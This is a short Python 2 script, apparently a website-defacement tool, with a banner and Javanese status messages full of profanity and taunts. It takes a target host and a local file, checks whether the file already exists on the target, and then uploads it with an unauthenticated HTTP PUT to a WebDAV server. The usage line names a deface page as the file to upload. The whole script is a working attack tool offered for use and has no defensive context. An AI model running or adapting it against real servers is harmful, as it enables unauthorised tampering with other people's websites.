#!/usr/bin/python

import requests
import string
import random
import sys
import os

os.system("clear")

print """
  _   _       _           _____             _______ 
 | \ | |     (_)         / ____|           |__   __|
 |  \| | ___  _ ___  ___| |     _ __ _   _ ___| | 
 | . ` |/ _ \| / __|/ _ | |    | '__| | | / __| |
 | |\  | (_) | \__ |  __| |____| |  | |_| \__ | | 
 |_| \_|\___/|_|___/\___|\_____|_|   \__,_|___|_|  """

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Jenenge File Mu Cokk !!! : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, Script Anyar") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Gagal bngst Hahahah Kapok Cokkk !!! . . .")
    sys.exit(1)
  else:
    print("[+] Uwes Cookkkk !!! . . .")
    print("[+] PATH : "+host + nama)


def cekfile():
 print("""
[*] WebDAV File Crottterz
[*] Gak Usah Nyocot Jancok !!!
[*] bngst
""")
 print("[*] Cek File Ndek Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Onok Seng Podo Cokk . . .")
  tanya = raw_input("[!] Di ubah opo Gak Cok ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] Wess Mari Jancok . . .")
   sys.exit()
 else:
   print("[*] File Ga Ndek Target . . .")
   print("[*] Proses Upload Script Mu Cokkkk . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    sys.exit(0)
  else:
    cekfile()
